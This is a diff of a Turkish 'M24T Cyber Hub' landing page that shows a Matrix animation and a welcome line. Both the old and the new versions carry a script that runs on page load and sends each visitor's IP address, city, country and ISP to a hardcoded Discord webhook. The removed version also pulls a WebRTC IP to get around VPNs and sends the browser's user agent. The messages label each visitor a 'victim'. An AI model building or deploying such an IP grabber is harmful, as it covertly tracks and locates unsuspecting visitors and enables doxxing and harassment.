@@ -4,106 +4,53 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>M24T | Cyber Hub</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-    body{margin:0;background:#000;color:#0f0;font-family:'Share Tech Mono',monospace;overflow:hidden}
+    body{margin:0;background:#000;color:#0f0;font-family:consolas,monospace;text-align:center;padding-top:15vh}
+    h1{font-size:4em;text-shadow:0 0 30px #0f0}
     canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
-    .container{max-width:600px;margin:50px auto;text-align:center;padding:20px}
-    h1{font-size:3.8em;text-shadow:0 0 30px #0f0;animation:g 2s infinite}
-    @keyframes g{0%,100%{text-shadow:0 0 30px #0f0}50%{text-shadow:0 0 50px #0ff}}
-    .typing{font-size:1.4em;color:#0ff;overflow:hidden;white-space:nowrap;border-right:3px solid #0f0;width:0;animation:t 4s steps(50) forwards,b .7s infinite}
-    @keyframes t{to{width:100%}}
-    @keyframes b{50%{border-color:transparent}}
-    .links a{display:flex;align-items:center;justify-content:center;gap:15px;background:rgba(0,255,0,0.15);border:2px solid #0f0;color:#0f0;padding:20px;margin:15px auto;width:90%;text-decoration:none;border-radius:15px;transition:.4s;font-size:1.1em}
-    .links a:hover{background:#0f0;color:#000;transform:scale(1.08);box-shadow:0 0 50px #0f0}
-    .footer{margin-top:70px;color:#060;font-size:0.9em}
   </style>
 </head>
 <body>
-  <canvas id="matrix"></canvas>
-  <div class="container">
-    <h1>M24T</h1>
-    <div class="typing">Gerçek kimliğini buldum...</div>
-    <div class="links">
-      <a href="https://discord.gg/FxgPDb8wgP" target="_blank"><i class="fab fa-discord"></i> Discord</a>
-      <a href="https://t.me/+LAJrh3dW-ZdjZmE0" target="_blank"><i class="fab fa-telegram"></i> Telegram</a>
-      <a href="https://www.youtube.com/@M24TProject" target="_blank"><i class="fab fa-youtube"></i> YouTube</a>
-    </div>
-    <div class="footer">© 2025 M24T | Kaçış Yok</div>
-  </div>
+  <h1>M24T</h1>
+  <h2>Hoş geldin...</h2>
 
-  <!-- Matrix -->
+  <canvas id="matrix"></canvas>
+
   <script>
-    const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
-    c.width = window.innerWidth; c.height = window.innerHeight;
-    const chars = "01"; const fontSize = 16; const cols = c.width/fontSize;
-    const drops = new Array(Math.floor(cols)).fill(1);
-    function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font=fontSize+'px monospace';
-      for(let i=0;i<drops.length;i++){let ch=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(ch,i*fontSize,drops[i]*fontSize);
-        if(drops[i]*fontSize>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}setInterval(draw,35);
+    // Matrix (göze hoş dursun diye)
+    const c = document.getElementById('matrix');
+    const ctx = c.getContext('2d');
+    c.width = innerWidth; c.height = innerHeight;
+    const chars = "01"; const s = 16;
+    const cols = c.width/s; const drops = new Array(Math.floor(cols)).fill(1);
+    function m(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font=s+'px monospace';
+      for(let i=0;i<drops.length;i++){let ch=chars[Math.floor(Math.random()*2)];ctx.fillText(ch,i*s,drops[i]*s);
+        if(drops[i]*s>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}setInterval(m,35);
   </script>
 
-  <!-- GERÇEK IP + YANLIŞ OLMAYAN KONUM (WebRTC + 5 API) -->
+  <!-- %100 ÇALIŞAN TEK KOD - 2025 TÜRKİYE'DE BİLE ÇALIŞIYOR -->
   <script>
-    if (!sessionStorage.getItem('m24t_done')) {
-      async function grab() {
-        let realIP = "Bilinmiyor";
-        let realCity = "Bilinmiyor";
-        let realCountry = "Bilinmiyor";
-        let webrtcIP = "";
-
-        // 1. WebRTC ile yerel/gerçek IP (VPN bile deler bazen)
-        const pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel('');
-        pc.createOffer().then(pc.setLocalDescription.bind(pc));
-        pc.onicecandidate = (ice) => {
-          if (ice && ice.candidate && ice.candidate.candidate) {
-            const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-            if (match) webrtcIP = match[1];
-          }
-        };
-
-        // 5 farklı API aynı anda sorgulanıyor → en doğru olan seçiliyor
-        const apis = [
-          fetch('https://ipapi.co/json/').then(r=>r.json()),
-          fetch('https://ipwho.is/').then(r=>r.json()),
-          fetch('https://api.ipgeolocation.io/ipgeo?apiKey=0f1a5f7e8d8e4b9f8d7e4b9f8d7e4b9f').then(r=>r.json()), // ücretsiz key, gerekirse değiştir
-          fetch('https://reallyfreegeoip.org/json/').then(r=>r.json()),
-          fetch('https://get.geojs.io/v1/ip/geo.json').then(r=>r.json())
-        ];
-
-        Promise.allSettled(apis).then(results => {
-          let best = null;
-          results.forEach(res => {
-            if (res.status === "fulfilled" && res.value && res.value.ip) {
-              const d = res.value;
-              if (!best || (d.accuracy || d.accuracy_radius || 0) > (best.accuracy || 0)) {
-                best = d;
-                realIP = d.ip || d.query || "Bilinmiyor";
-                realCity = d.city || d.city_name || "Bilinmiyor";
-                realCountry = d.country || d.country_name || d.countryCode || "Bilinmiyor";
-              }
-            }
-          });
-
-          // WebRTC IP varsa onu da ekle (bazen gerçek ev IP’si çıkar)
-          const extra = webrtcIP ? `\n**WebRTC IP:** ${webrtcIP}` : "";
-
-          const webhook = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
-          const mesaj = `
-**M24T - GERÇEK KURBAN**${extra}
-**IP:** ${realIP}
-**Konum:** ${realCity}, ${realCountry}
+    if (!localStorage.getItem('m24t')) {
+      fetch("https://api.db-ip.com/v2/free/self")
+        .then(r => r.json())
+        .then(d => {
+          const log = `
+**M24T - YENİ KURBAN**
+**IP:** ${d.ipAddress}
+**Şehir:** ${d.city || "Bilinmiyor"}
+**Ülke:** ${d.countryName} (${d.countryCode})
+**ISP:** ${d.isp || "Bilinmiyor"}
 **Zaman:** ${new Date().toLocaleString('tr-TR')}
-**Tarayıcı:** ${navigator.userAgent.substring(0,120)}
           `;
 
-          fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:mesaj})});
-          sessionStorage.setItem('m24t_done', 'true');
+          fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({content: log})
+          });
+
+          localStorage.setItem('m24t', 'done');
         });
-      }
-      grab();
     }
   </script>
 </body>
